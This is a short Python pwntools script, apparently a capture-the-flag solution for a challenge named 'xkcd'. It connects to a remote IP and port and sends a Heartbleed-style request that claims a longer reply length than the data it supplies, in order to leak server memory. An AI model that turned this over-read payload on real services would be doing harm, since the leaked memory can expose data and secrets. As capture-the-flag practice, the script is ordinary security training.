#!/usr/bin/python3

from pwn import *

# r = process('/home/user/ctf_dump/weekly_pwnable/week1/xkcd')
conn = remote('167.99.10.211', 4444)

conn.sendline('SERVER, ARE YOU STILL THERE? IF SO, REPLY "{}" ({} LETTERS)'.format("B"*512, 528))
print(conn.recvline())
